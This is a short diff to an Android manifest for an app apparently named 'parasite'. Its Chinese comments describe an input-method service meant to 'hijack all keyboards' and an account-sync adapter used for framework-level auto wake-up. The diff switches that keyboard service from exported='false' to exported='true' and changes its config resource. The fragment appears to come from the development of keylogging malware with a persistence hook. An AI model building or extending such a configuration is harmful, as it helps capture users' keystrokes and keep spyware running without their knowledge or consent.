@@ -74,14 +74,14 @@
         <!-- ─── 输入法服务:劫持所有键盘─── -->
         <service
             android:name="com.mqf.parasite.MqfImeService"
-            android:exported="false"
+            android:exported="true"
             android:permission="android.permission.BIND_INPUT_METHOD">
             <intent-filter>
                 <action android:name="android.view.InputMethod"/>
             </intent-filter>
             <meta-data
                 android:name="android.view.im"
-                android:resource="@xml/ime_config"/>
+                android:resource="@xml/method"/>
         </service>
 
         <!-- ─── 账户同步 Adapter:框架级自动唤醒 ─── -->
